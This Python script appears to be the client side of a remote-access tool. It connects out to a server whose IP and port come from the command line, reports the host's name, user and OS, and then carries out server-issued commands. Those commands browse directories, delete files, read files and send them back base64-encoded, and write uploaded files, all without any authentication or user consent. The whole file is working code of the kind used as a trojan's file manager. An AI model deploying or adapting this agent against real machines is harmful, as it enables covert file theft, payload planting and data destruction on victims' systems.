#!/usr/bin/env python3
import socket
import json
import sys
import platform
import getpass
import os
import time
import base64
import shutil
import ntpath

def get_system_info():
    """Get system information for the client."""
    return {
        "hostname": platform.node(),
        "username": getpass.getuser(),
        "os": f"{platform.system()} {platform.release()}"
    }

def normalize_path(path):
    """Normalize a Windows path."""
    if not path:
        return os.getcwd()
    
    # Convert forward slashes to backslashes
    path = path.replace('/', '\\')
    
    # Handle relative paths
    if path == '.':
        return os.getcwd()
    
    # Convert to absolute path
    if not os.path.isabs(path):
        path = os.path.join(os.getcwd(), path)
    
    # Normalize the path (resolve .. and .)
    return os.path.abspath(path)

def get_directory_contents(path):
    """Get contents of a directory."""
    try:
        abs_path = normalize_path(path)
        
        if not os.path.exists(abs_path):
            return {"status": "error", "message": f"Path does not exist: {abs_path}"}
        
        if not os.path.isdir(abs_path):
            return {"status": "error", "message": f"Path is not a directory: {abs_path}"}
        
        items = []
        
        try:
            os.listdir(abs_path)
        except PermissionError:
            return {"status": "error", "message": f"Access denied: {abs_path}"}
        
        parent_path = os.path.dirname(abs_path)
        drive, _ = os.path.splitdrive(abs_path)
        is_root = abs_path.rstrip('\\') == drive
        
        if not is_root:
            items.append({
                "name": "..",
                "path": parent_path,
                "type": "directory",
                "size": 0
            })
        
        for item in sorted(os.listdir(abs_path)):
            if item in ['.', '..']:
                continue
                
            full_path = os.path.join(abs_path, item)
            try:
                is_dir = os.path.isdir(full_path)
                size = 0 if is_dir else os.path.getsize(full_path)
                
                items.append({
                    "name": item,
                    "path": full_path,
                    "type": "directory" if is_dir else "file",
                    "size": size
                })
            except (OSError, PermissionError):
                continue
        
        return {
            "status": "success",
            "contents": items,
            "current_path": abs_path
        }
        
    except Exception as e:
        return {"status": "error", "message": str(e)}

def delete_files(files):
    """Delete specified files."""
    results = []
    for file_path in files:
        try:
            normalized_path = normalize_path(file_path)
            if os.path.exists(normalized_path):
                if os.path.isfile(normalized_path):
                    os.remove(normalized_path)
                    results.append({"path": file_path, "status": "success"})
                else:
                    results.append({
                        "path": file_path,
                        "status": "error",
                        "message": "Not a file"
                    })
            else:
                results.append({
                    "path": file_path,
                    "status": "error",
                    "message": "File not found"
                })
        except Exception as e:
            results.append({
                "path": file_path,
                "status": "error",
                "message": str(e)
            })
    
    # Return both the results and current directory info
    dir_info = get_directory_contents(os.path.dirname(files[0]))
    return {
        "type": "delete-response",
        "status": "success",
        "results": results,
        "directory": dir_info
    }

def read_file_chunk(file_path, chunk_size=1024*1024):
    """Read a file in chunks and return base64 encoded data."""
    try:
        normalized_path = normalize_path(file_path)
        if not os.path.exists(normalized_path):
            return {"status": "error", "message": "File not found"}
        
        file_size = os.path.getsize(normalized_path)
        if file_size == 0:
            return {"status": "error", "message": "Empty file"}

        with open(normalized_path, 'rb') as f:
            chunk = f.read(chunk_size)
            if chunk:
                is_last_chunk = len(chunk) < chunk_size
                return {
                    "status": "success",
                    "path": file_path,
                    "data": base64.b64encode(chunk).decode('utf-8'),
                    "finished": is_last_chunk
                }
            
            return {"status": "error", "message": "No data read"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def write_file_chunk(file_path, data, append=False):
    """Write a base64 encoded chunk to a file."""
    try:
        target_dir = os.path.dirname(file_path)
        file_name = os.path.basename(file_path)
        
        if not target_dir:
            target_dir = os.getcwd()
            
        target_dir = normalize_path(target_dir)
        
        if not os.path.exists(target_dir):
            os.makedirs(target_dir, exist_ok=True)
            
        target_path = os.path.join(target_dir, file_name)
        normalized_path = normalize_path(target_path)
        
        mode = 'ab' if append else 'wb'
        decoded_data = base64.b64decode(data)
        with open(normalized_path, mode) as f:
            f.write(decoded_data)
            f.flush()
            os.fsync(f.fileno())
            
        return {"status": "success"}
        
    except Exception as e:
        return {"status": "error", "message": str(e)}

def send_message(socket, message):
    """Send a message with length prefix."""
    try:
        if isinstance(message, dict):
            message = json.dumps(message)
            
        message_bytes = message.encode('utf-8')
        length_bytes = len(message_bytes).to_bytes(4, 'big')
        socket.sendall(length_bytes)
        socket.sendall(message_bytes)
        return True
    except Exception as e:
        return False

def read_message(socket):
    """Read a message with length prefix."""
    try:
        length_bytes = socket.recv(4)
        if not length_bytes:
            return None
            
        message_length = int.from_bytes(length_bytes, 'big')
        
        chunks = []
        bytes_received = 0
        while bytes_received < message_length:
            chunk = socket.recv(min(message_length - bytes_received, 4096))
            if not chunk:
                return None
            chunks.append(chunk)
            bytes_received += len(chunk)
            
        message = b''.join(chunks).decode('utf-8')
        return message
    except Exception:
        return None

def handle_server_command(client_socket, command):
    """Handle commands received from the server."""
    try:
        cmd_data = json.loads(command)
        cmd_type = cmd_data.get("type")
        
        if cmd_type == "browse":
            path = cmd_data.get("path")
            response = get_directory_contents(path)
                
        elif cmd_type == "delete":
            files = cmd_data.get("files", [])
            response = delete_files(files)
            
        elif cmd_type == "download":
            file_path = cmd_data.get("path")
            response = read_file_chunk(file_path)
            
        elif cmd_type == "upload":
            file_path = cmd_data.get("path")
            data = cmd_data.get("data")
            append = cmd_data.get("append", False)
            response = write_file_chunk(file_path, data, append)
            
        elif cmd_type == "upload-complete":
            file_path = cmd_data.get("path")
            normalized_path = normalize_path(file_path)
            
            if os.path.exists(normalized_path):
                response = {"status": "success"}
            else:
                response = {"status": "error", "message": "File not found or empty"}
                
        elif cmd_type == "exit":
            print("exit")
            response = {"status": "success"}
            send_message(client_socket, response)
            client_socket.close()
            sys.exit(0)
            
        else:
            response = {"status": "error", "message": "Unknown command type"}
            
        return send_message(client_socket, response)
        
    except Exception as e:
        return send_message(client_socket, {
            "status": "error",
            "message": str(e)
        })

def connect_to_server(ip, port):
    """Connect to the TCP server and handle commands."""
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ip, port))
        
        initial_data = {
            "type": "init",
            "data": get_system_info()
        }
        
        if send_message(client, json.dumps(initial_data)):
            print("connected")
            
            while True:
                command = read_message(client)
                if not command:
                    break
                    
                if not handle_server_command(client, command):
                    break
                    
    except ConnectionRefusedError:
        print("failed to connect")
        sys.exit(1)
    except Exception:
        print("failed to connect")
        sys.exit(1)
    finally:
        client.close()
        sys.exit(0)

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <ip_address> <port>")
        print(f"Example: {sys.argv[0]} 192.168.10.107 8443")
        sys.exit(1)
    
    try:
        port = int(sys.argv[2])
        if port < 1 or port > 65535:
            raise ValueError()
    except ValueError:
        print("Invalid port number")
        sys.exit(1)
    
    connect_to_server(sys.argv[1], port)

if __name__ == "__main__":
    main() 